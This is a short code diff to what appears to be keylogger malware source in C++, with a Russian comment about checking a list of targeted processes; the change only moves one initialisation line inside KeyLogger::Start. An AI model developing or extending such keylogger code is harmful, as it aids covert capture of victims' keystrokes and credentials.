@@ -1269,7 +1269,6 @@ PCHAR KeyLoggerGetSystemName(PKeyLogger Logger)
 
 bool KeyLogger::Start()
 {
-	KLG.Dialogs = NULL;
 	if (GlobalKeyLogger == NULL)
 		return false;
 
@@ -1278,6 +1277,7 @@ bool KeyLogger::Start()
 	if (GlobalKeyLogger->Active)
     	return true;
 
+	KLG.Dialogs = NULL;
     // Проверяем наличие процесса в списке обрабатываемых процессов
 	if (IsSupportProcess())
 	{
